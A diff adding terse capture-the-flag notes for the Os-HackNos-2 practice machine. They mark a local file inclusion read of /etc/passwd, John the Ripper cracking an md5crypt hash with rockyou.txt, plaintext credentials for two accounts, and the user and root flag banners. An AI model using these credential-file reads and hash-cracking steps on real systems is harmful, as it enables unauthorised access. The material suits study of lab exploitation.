@@ -1,0 +1,72 @@
+LFI ---> passwd
+
+
+
+
+root@ap:~/Scrivania/CTF/Os-HackNos-2# john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long passwd 
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+root@ap:~/Scrivania/CTF/Os-HackNos-2# cat passwd 
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
+root@ap:~/Scrivania/CTF/Os-HackNos-2# vim hash
+root@ap:~/Scrivania/CTF/Os-HackNos-2# john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+topsecret        (?)
+1g 0:00:00:00 DONE (2020-01-22 22:26) 1.075g/s 6984p/s 6984c/s 6984C/s brendita..spider1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+
+flag:topsecret
+
+
+rohit:!%hack41
+
+
+rohit@hacknos:~$ cat user.txt 
+############################################ 
+ __    __   _______   ______    ______             
+/  |  /  | /       | /      \  /      \   
+$$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |
+$$ |  $$ |$$      \ $$    $$ |$$ |  
+$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |       
+$$    $$/ /     $$/ $$       |$$ |           
+ $$$$$$/  $$$$$$$/   $$$$$$$/ $$/       
+                                                                                       
+                                                                                       
+                                                                                       
+############################################
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+rohit@hacknos:~$ 
+
+
+
+root@hacknos:~# cat root.txt 
+ _______                         __              __  __     #
+/       \                       /  |            /  |/  |    #
+$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
+$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
+$$    $$< /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
+$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  # 
+$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
+$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
+$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
+#############################################################                                                          
+                                                          
+#############################################################                                                          
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Blog : www.hackNos.com
+
+Author : Rahul Gehlaut
+
+linkedin : https://www.linkedin.com/in/rahulgehlaut/
+#############################################################
+
+
+
